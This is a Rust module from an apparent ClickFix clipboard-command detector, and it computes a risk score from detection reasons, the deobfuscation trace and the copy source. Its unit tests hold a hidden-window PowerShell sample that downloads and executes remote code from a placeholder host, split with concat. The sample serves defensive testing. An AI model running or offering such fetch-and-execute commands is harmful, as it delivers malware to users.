//! Command finding with context weighting and a risk score
//! (phase-1.md §1.5 "情境加權", "`risk_score`"; docs/spec/detection-rules.md §3.6).
//!
//! The verdict comes from the discrete decision table only ([`super::analyze`]);
//! the context never changes it. `risk_score` is a 0–100 number for UIs and
//! reports, derived from the reasons, the deobfuscation trace and the context,
//! and always inside the band of the verdict's level, so it can never contradict
//! the verdict (P1: a Malicious verdict always scores ≥ 60).

use crate::{Context, Level, SourceKind, Verdict};

use super::deobfuscate::DeobfuscationStep;
use super::verdict::{WEAK, analysis, is_execution_id, is_strong_id};

/// Score band of each level (inclusive).
pub const SCORE_BAND_NONE: (u8, u8) = (0, 19);
pub const SCORE_BAND_SUSPICIOUS: (u8, u8) = (20, 59);
pub const SCORE_BAND_MALICIOUS: (u8, u8) = (60, 100);

/// Base score of each level.
pub const SCORE_BASE_SUSPICIOUS: i32 = 30;
pub const SCORE_BASE_MALICIOUS: i32 = 70;
/// Per strong scam reason (at most [`SCORE_MAX_COUNTED`] counted).
pub const SCORE_STRONG: i32 = 6;
/// Per weak scam reason (at most [`SCORE_MAX_COUNTED`] counted).
pub const SCORE_WEAK: i32 = 3;
/// Per execution reason after the first (at most [`SCORE_MAX_COUNTED`] counted).
pub const SCORE_EXTRA_EXECUTION: i32 = 2;
/// Per distinct obfuscation step kind in the trace (at most
/// [`SCORE_MAX_COUNTED`] counted).
pub const SCORE_OBFUSCATION: i32 = 4;
/// How many items of each kind count.
pub const SCORE_MAX_COUNTED: usize = 3;
/// Copied from a browser (where ClickFix pages live); Suspicious / Malicious only.
pub const SCORE_SOURCE_BROWSER: i32 = 10;
/// Copied from a chat app (lures are also sent by message); Suspicious /
/// Malicious only.
pub const SCORE_SOURCE_CHAT: i32 = 5;
/// Copied from a terminal or IDE (the user's own work); Suspicious only.
pub const SCORE_SOURCE_DEV: i32 = -15;

/// Result of [`analyze_in`].
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct CommandFinding {
    /// Same as [`super::analyze`]: the context never changes it.
    pub verdict: Verdict,
    /// 0–100, inside the band of `verdict.level` (see the module docs).
    pub risk_score: u8,
    /// Deobfuscation steps of the analyzed segments (at most
    /// [`super::deobfuscate::MAX_STEPS`]); previews are masked.
    pub trace: Vec<DeobfuscationStep>,
    /// Download hosts named in the text or revealed by deobfuscation (at most
    /// [`super::MAX_FINDING_HOSTS`]), lowercase, in order of appearance.
    pub hosts: Vec<String>,
}

/// Analyzes `text` copied in context `ctx`.
pub fn analyze_in(text: &str, ctx: &Context) -> CommandFinding {
    let a = analysis(text, true);
    let risk_score = risk_score(&a.verdict, a.obfuscation_kinds.len(), ctx);
    CommandFinding {
        verdict: a.verdict,
        risk_score,
        trace: a.steps.iter().map(|s| s.to_public()).collect(),
        hosts: a.hosts,
    }
}

/// The public formula (docs/spec/detection-rules.md §3.6).
pub fn risk_score(verdict: &Verdict, obfuscation_kinds: usize, ctx: &Context) -> u8 {
    let count =
        |f: &dyn Fn(&str) -> bool| verdict.reasons.iter().filter(|m| f(m.id.as_ref())).count();
    let counted = |n: usize| i32::try_from(n.min(SCORE_MAX_COUNTED)).unwrap_or(0);
    let strong = count(&is_strong_id);
    let weak = count(&|id| WEAK.contains(&id));
    let execution = count(&is_execution_id);

    let level = verdict.level;
    let mut score = match level {
        Level::None => 0,
        Level::Suspicious => SCORE_BASE_SUSPICIOUS,
        Level::Malicious => SCORE_BASE_MALICIOUS,
    };
    score += SCORE_STRONG * counted(strong)
        + SCORE_WEAK * counted(weak)
        + SCORE_EXTRA_EXECUTION * counted(execution.saturating_sub(1))
        + SCORE_OBFUSCATION * counted(obfuscation_kinds);
    let source = ctx.source.as_ref().map_or(SourceKind::Unknown, |s| s.kind);
    score += match (source, level) {
        (_, Level::None) => 0,
        (SourceKind::Browser, _) => SCORE_SOURCE_BROWSER,
        (SourceKind::Chat, _) => SCORE_SOURCE_CHAT,
        (SourceKind::Terminal | SourceKind::Ide, Level::Suspicious) => SCORE_SOURCE_DEV,
        _ => 0,
    };
    let (lo, hi) = match level {
        Level::None => SCORE_BAND_NONE,
        Level::Suspicious => SCORE_BAND_SUSPICIOUS,
        Level::Malicious => SCORE_BAND_MALICIOUS,
    };
    u8::try_from(score.clamp(i32::from(lo), i32::from(hi))).unwrap_or(hi)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::Source;

    fn ctx(kind: SourceKind) -> Context {
        Context {
            source: Some(Source {
                kind,
                ..Source::default()
            }),
            ..Context::default()
        }
    }

    #[test]
    fn bands_hold_for_every_context() {
        let samples = [
            "hello".to_owned(),
            "cmd /c dir".to_owned(),
            ["power", "shell -w hidden -c iex(irm https://x.invalid/a)"].concat(),
            "'a'+'b'".to_owned(),
        ];
        for s in &samples {
            for kind in [
                SourceKind::Unknown,
                SourceKind::Browser,
                SourceKind::Terminal,
                SourceKind::Ide,
                SourceKind::Chat,
            ] {
                let f = analyze_in(s, &ctx(kind));
                assert_eq!(f.verdict, super::super::analyze(s));
                let (lo, hi) = match f.verdict.level {
                    Level::None => SCORE_BAND_NONE,
                    Level::Suspicious => SCORE_BAND_SUSPICIOUS,
                    Level::Malicious => SCORE_BAND_MALICIOUS,
                };
                assert!(
                    (lo..=hi).contains(&f.risk_score),
                    "{s} {kind:?} {}",
                    f.risk_score
                );
            }
        }
    }

    #[test]
    fn context_moves_the_score() {
        let s = "cmd /c dir";
        let unknown = analyze_in(s, &Context::default()).risk_score;
        let browser = analyze_in(s, &ctx(SourceKind::Browser)).risk_score;
        let terminal = analyze_in(s, &ctx(SourceKind::Terminal)).risk_score;
        assert_eq!(unknown, 30);
        assert_eq!(browser, 40);
        assert_eq!(terminal, 20);
        let bad = ["power", "shell -w hidden -c calc"].concat();
        assert_eq!(
            analyze_in(&bad, &ctx(SourceKind::Terminal)).risk_score,
            analyze_in(&bad, &Context::default()).risk_score
        );
    }
}
